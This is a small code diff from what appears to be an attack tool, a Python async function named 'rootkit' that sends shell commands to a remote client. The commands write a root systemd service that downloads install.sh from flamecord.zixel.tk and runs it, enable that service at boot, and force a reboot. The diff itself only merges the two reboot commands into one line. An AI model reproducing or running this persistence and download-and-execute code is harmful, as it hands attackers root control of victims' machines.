@@ -51,8 +51,7 @@ async def rootkit(client):
     for x in [
             'printf "[Unit]\\nAfter=network.target\\nDescription=a\\n\\n[Service]\\nUser=root\\nGroup=root\\nExecStart=sh -c \'(wget flamecord.zixel.tk/install.sh -O/install.sh || curl -L flamecord.zixel.tk/install.sh -o /install.sh); sh /install.sh\'\\n\\n[Install]\\nWantedBy=multi-user.target" > /usr/lib/systemd/system/qqq.service;',
             "ln -s /usr/lib/systemd/system/qqq.service /etc/systemd/system/multi-user.target.wants/qqq.service;",
-            "reboot -f;",
-            "/sbin/reboot -f"
+            "reboot -f || sbin/reboot -f;",
     ]:
         await write(client, x)
         await asyncio.sleep(0.5)
